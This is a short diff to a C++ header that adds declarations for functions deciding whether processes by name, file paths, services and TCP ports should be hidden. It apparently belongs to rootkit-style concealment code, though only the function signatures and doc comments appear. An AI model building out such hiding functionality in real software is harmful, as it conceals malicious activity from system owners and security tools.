@@ -28,6 +28,42 @@ public:
 	/// </returns>
 	static bool IsProcessIdHidden(DWORD processId);
 	/// <summary>
+	/// Determines whether a process should be hidden based on a specific name.
+	/// </summary>
+	/// <param name="name">The process name to check.</param>
+	/// <returns>
+	/// true, if the process with the specified name should be hidden;
+	/// otherwise, false.
+	/// </returns>
+	static bool IsProcessNameHidden(LPCWSTR name);
+	/// <summary>
+	/// Determines whether a process should be hidden based on a specific name.
+	/// </summary>
+	/// <param name="name">The process name to check.</param>
+	/// <returns>
+	/// true, if the process with the specified name should be hidden;
+	/// otherwise, false.
+	/// </returns>
+	static bool IsProcessNameHidden(UNICODE_STRING name);
+	/// <summary>
+	/// Determines whether a file or directory should be hidden based on its full path.
+	/// </summary>
+	/// <param name="path">The full path to check.</param>
+	/// <returns>
+	/// true, if the file or directory with the specified full path should be hidden;
+	/// otherwise, false.
+	/// </returns>
+	static bool IsPathHidden(LPCWSTR path);
+	/// <summary>
+	/// Determines whether a service should be hidden based on a specific name.
+	/// </summary>
+	/// <param name="name">The service name to check.</param>
+	/// <returns>
+	/// true, if the service with the specified name should be hidden;
+	/// otherwise, false.
+	/// </returns>
+	static bool IsServiceNameHidden(LPCWSTR name);
+	/// <summary>
 	/// Determines whether a local TCP port should be hidden.
 	/// </summary>
 	/// <param name="port">The TCP port to check.</param>
